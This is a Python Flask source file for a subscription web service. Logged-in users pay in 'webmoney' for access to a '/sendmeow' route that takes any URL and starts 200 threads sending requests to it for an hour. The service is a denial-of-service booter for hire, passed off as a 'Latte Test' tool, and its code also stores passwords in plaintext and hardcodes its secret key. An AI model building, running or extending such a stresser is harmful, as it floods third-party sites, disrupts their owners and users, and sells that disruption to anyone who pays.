from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3, threading, requests, time
from datetime import datetime, timedelta

app = Flask(__name__)
app.secret_key = 'latte_secret'

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

# === INIT ===
def init_db():
    with get_db() as db:
        db.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE,
                password TEXT,
                webmoney INTEGER DEFAULT 0,
                subscription_until TEXT DEFAULT NULL
            )
        ''')
        db.commit()
init_db()

# === HELPER ===
def is_logged_in():
    return 'user_id' in session

def is_admin():
    return session.get('username') == "chafyyadmin1927291723928220"

def has_active_subscription(user):
    if not user['subscription_until']:
        return False
    return datetime.strptime(user['subscription_until'], "%Y-%m-%d") >= datetime.today()

# === ROUTES ===
@app.route('/')
def index():
    if not is_logged_in():
        return redirect('/login')
    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
    return render_template('index.html', user=user, has_sub=has_active_subscription(user))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        with get_db() as db:
            user = db.execute("SELECT * FROM users WHERE username = ? AND password = ?",
                              (request.form['username'], request.form['password'])).fetchone()
        if user:
            session['user_id'] = user['id']
            session['username'] = user['username']
            return redirect('/')
        else:
            return "Login failed"
    return render_template('login.html')

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        try:
            with get_db() as db:
                db.execute("INSERT INTO users (username, password) VALUES (?, ?)",
                           (request.form['username'], request.form['password']))
                db.commit()
            return redirect('/login')
        except:
            return "User already exists"
    return render_template('signup.html')

@app.route('/dashboard')
def dashboard():
    if not is_logged_in(): return redirect('/login')
    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
    return render_template('dashboard.html', user=user, has_sub=has_active_subscription(user))

@app.route('/subscriptions', methods=['GET', 'POST'])
def subscriptions():
    if not is_logged_in(): return redirect('/login')
    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
        if request.method == 'POST':
            plan = request.form['plan']
            cost = 1500 if plan == "month" else 8500
            if user['webmoney'] >= cost:
                days = 30 if plan == "month" else 365
                until = datetime.today() + timedelta(days=days)
                db.execute("UPDATE users SET webmoney = webmoney - ?, subscription_until = ? WHERE id = ?",
                           (cost, until.strftime("%Y-%m-%d"), user['id']))
                db.commit()
                return redirect('/dashboard')
    return render_template('subscriptions.html', user=user)

@app.route('/settings', methods=['GET', 'POST'])
def settings():
    if not is_logged_in(): return redirect('/login')
    if request.method == 'POST':
        with get_db() as db:
            db.execute("UPDATE users SET password = ? WHERE id = ?", 
                       (request.form['password'], session['user_id']))
            db.commit()
            return redirect('/dashboard')
    return render_template('settings.html')

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if not is_logged_in() or not is_admin():
        return "Forbidden"
    if request.method == 'POST':
        username = request.form['username']
        amount = int(request.form['amount'])
        with get_db() as db:
            db.execute("UPDATE users SET webmoney = webmoney + ? WHERE username = ?", (amount, username))
            db.commit()
    return render_template('admin.html')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

@app.route('/sendmeow', methods=['POST'])
def sendmeow():
    if not is_logged_in(): return redirect('/login')
    with get_db() as db:
        user = db.execute("SELECT * FROM users WHERE id = ?", (session['user_id'],)).fetchone()
    if not has_active_subscription(user):
        return "Access Denied"
    url = request.form['url']
    threading.Thread(target=latte_test, args=(url,)).start()
    return "Latte Test gestartet"

# === TEST TOOL ===
def latte_test(url):
    THREAD_COUNT = 200
    TEST_DURATION = 3600
    TIMEOUT = 2
    def attack():
        ende = time.time() + TEST_DURATION
        while time.time() < ende:
            try:
                requests.get(url, timeout=TIMEOUT)
            except:
                pass
    threads = [threading.Thread(target=attack) for _ in range(THREAD_COUNT)]
    [t.start() for t in threads]
    [t.join() for t in threads]

if __name__ == '__main__':
    app.run(debug=True)
